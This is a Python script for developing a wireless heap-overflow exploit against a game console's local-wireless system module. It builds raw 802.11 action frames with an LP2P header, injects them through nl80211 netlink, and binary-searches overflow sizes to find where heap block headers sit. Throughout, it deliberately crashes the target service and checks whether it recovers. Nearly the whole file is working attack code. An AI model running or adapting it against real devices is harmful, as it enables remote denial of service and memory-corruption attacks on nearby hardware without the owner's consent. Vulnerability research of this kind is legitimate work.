#!/usr/bin/env -S python3 -u
"""Re-probe the heap layout after sysmodule restart.

The free block at parser+0x7AC was found under a specific heap instance.
After crashes/restarts, the layout changes. This script:
1. Verifies no-overflow frames are safe (body_size < parser allocation)
2. Verifies small overflow (64B) is safe
3. Binary searches for the new crash boundary (free block offset)
4. Probes the new free block header
"""

import os
import struct
import socket
import time
import subprocess

IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_body(body_size):
    """Build type 3 body with zero fill."""
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, 0x0100)
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=45):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_size(fam_id, ifindex, body_size, frame_count=80):
    """Returns True if sysmodule survives, False if crash, None if unreachable."""
    if not check_alive():
        if not wait_alive(45):
            return None

    body = build_body(body_size)
    frame = build_frame(body)

    for i in range(frame_count):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)

    time.sleep(3)
    a1 = check_alive()
    time.sleep(5)
    a2 = check_alive()
    p = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                        capture_output=True).returncode == 0
    return a2 and p


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    # Wait for clean state
    print("\nWaiting 10s for sysmodule to stabilize after prior crashes...")
    time.sleep(10)
    if not check_alive():
        print("Switch is DOWN. Waiting for recovery...")
        if not wait_alive(60):
            print("Switch did not recover. Exiting.")
            return
    print("Switch is alive.")

    # Step 1: No-overflow test
    print(f"\n{'='*65}")
    print("  STEP 1: No-overflow sanity check")
    print("="*65)

    for bs in [0x100, 0x200, 0x400]:
        r = test_size(fam_id, ifindex, bs)
        status = "OK" if r else "CRASH" if r is not None else "SKIP"
        overflow = max(0, bs - 0x5C)
        print(f"  body_size=0x{bs:04x} (overflow={overflow:4d}B): {status}")
        if not r and r is not None:
            time.sleep(15)
            wait_alive(45)

    # Step 2: Progressive overflow with zero fill
    print(f"\n{'='*65}")
    print("  STEP 2: Progressive overflow (zero fill, no FR fix)")
    print("="*65)

    # These are ALL zeros. If the heap block headers are at known
    # offsets, writing zeros to them should crash (magic=0 is invalid).
    # The crash point tells us where the first critical header is.
    test_sizes = [0x100, 0x200, 0x400, 0x500, 0x57C, 0x5BC, 0x600,
                  0x650, 0x6A0, 0x700, 0x740, 0x760, 0x780, 0x7A0,
                  0x7B0, 0x7C0, 0x7D0, 0x7E0, 0x7F0, 0x800]

    last_ok = 0
    first_crash = None
    for bs in test_sizes:
        r = test_size(fam_id, ifindex, bs)
        status = "OK" if r else "CRASH" if r is not None else "SKIP"
        overflow = max(0, bs - 0x5C)
        print(f"  body_size=0x{bs:04x} (overflow=0x{overflow:04x}): {status}")
        if r:
            last_ok = bs
        elif r is not None and first_crash is None:
            first_crash = bs
            time.sleep(15)
            wait_alive(45)
        elif r is not None:
            time.sleep(15)
            wait_alive(45)

    if first_crash:
        # Fine-grained search
        print(f"\n  Crash boundary between 0x{last_ok:04x} and 0x{first_crash:04x}")
        print(f"  Fine-grained search:")
        lo, hi = last_ok, first_crash
        while hi - lo > 1:
            mid = (lo + hi) // 2
            r = test_size(fam_id, ifindex, mid)
            if r is None:
                time.sleep(15)
                wait_alive(45)
                continue
            overflow = max(0, mid - 0x5C)
            status = "OK" if r else "CRASH"
            print(f"    body_size=0x{mid:04x} (overflow=0x{overflow:04x}): {status}")
            if r:
                lo = mid
            else:
                hi = mid
                time.sleep(15)
                wait_alive(45)

        crash_body = hi
        crash_overflow = crash_body - 0x5C
        crash_parser_offset = crash_overflow
        print(f"\n  *** NEW CRASH BOUNDARY: body_size=0x{crash_body:04x} ***")
        print(f"  *** overflow=0x{crash_overflow:04x} bytes ***")
        print(f"  *** parser+0x{crash_parser_offset + 0x5C:04x} ***")
        print(f"  (Previously was parser+0x7AD → body_size=0x751)")
    else:
        print("\n  No crashes found! Full 0x800 overflow with zeros is safe.")


if __name__ == "__main__":
    main()
